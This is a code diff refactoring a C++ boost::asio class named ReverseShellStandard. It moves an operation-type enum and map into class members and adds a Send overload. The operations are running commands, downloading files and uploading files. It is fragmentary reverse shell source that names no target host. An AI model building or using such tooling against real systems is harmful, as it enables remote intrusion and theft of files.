@@ -7,6 +7,7 @@
 #include <fstream>
 #include <filesystem>
 #include <iostream>
+#include <boost/format.hpp>
 
 class ReverseShellStandard 
 {
@@ -14,6 +15,8 @@ class ReverseShellStandard
 	#define DEFAULT_BUFFER_SIZE 1024
 
 protected:
+	enum OperationType { RUN_COMMAND = 1, DOWNLOAD_FILE, UPLOAD_FILE, INVALID };
+
 	ReverseShellStandard()
 		: m_ioService(IoService()), m_socket(m_ioService){}
 
@@ -28,6 +31,17 @@ protected:
 		m_file.open(filePath, mode);
 		if (!m_file)
 			throw; // TODO - throw specific exception
+	}
+
+	size_t Send(const OperationType& operationType)
+	{
+		for (auto const& pair : m_operations)
+		{
+			if (pair.second == operationType)
+				return Send(pair.first);
+		}
+
+		throw std::invalid_argument("The OperationType passed isn't a valid argument as it isn't in m_operations");
 	}
 
 	size_t Send(int numberToSend)
@@ -73,20 +87,12 @@ private:
 	}
 
 protected:
-	enum OperationType { RUN_COMMAND = 1, DOWNLOAD_FILE, UPLOAD_FILE, INVALID };
 	OperationType GetOperationType(const std::string& operation)
 	{
-		std::unordered_map<std::string, OperationType> operations
-		{
-			{"1", RUN_COMMAND},
-			{"2", DOWNLOAD_FILE},
-			{"3", UPLOAD_FILE}
-		};
-
-		if (!operations.count(operation))
+		if (!m_operations.count(operation))
 			return INVALID;
 
-		return operations[operation];
+		return m_operations[operation];
 	}
 
 	void UploadFile(const std::string& localFilePath)
@@ -172,6 +178,12 @@ protected:
 	boost::asio::streambuf m_responseBuf;
 	const std::string m_delimiter = "#\r\n$\r\n#";
 	std::fstream m_file;
+	std::unordered_map<std::string, OperationType> m_operations
+	{
+		{"1", RUN_COMMAND},
+		{"2", DOWNLOAD_FILE},
+		{"3", UPLOAD_FILE}
+	};
 
 public:
 	boost::system::error_code m_errorCode;
